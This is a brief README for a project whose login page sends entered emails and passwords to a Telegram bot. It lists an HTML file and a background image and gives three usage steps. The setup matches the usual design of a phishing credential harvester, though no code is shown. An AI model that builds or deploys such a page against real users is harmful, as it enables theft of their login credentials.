# My Project

This project contains a simple login form that sends credentials to a Telegram bot.

## Files
- `index.html`: The main HTML file for the login form.
- `bg.jpg`: Background image for the login form.

## How to Use
1. Open `index.html` in a browser.
2. Enter the email and password, and submit the form.
3. The credentials will be sent to a Telegram bot.

## Security Note
This form sends sensitive data (email and password) to a Telegram bot, so use caution when testing.
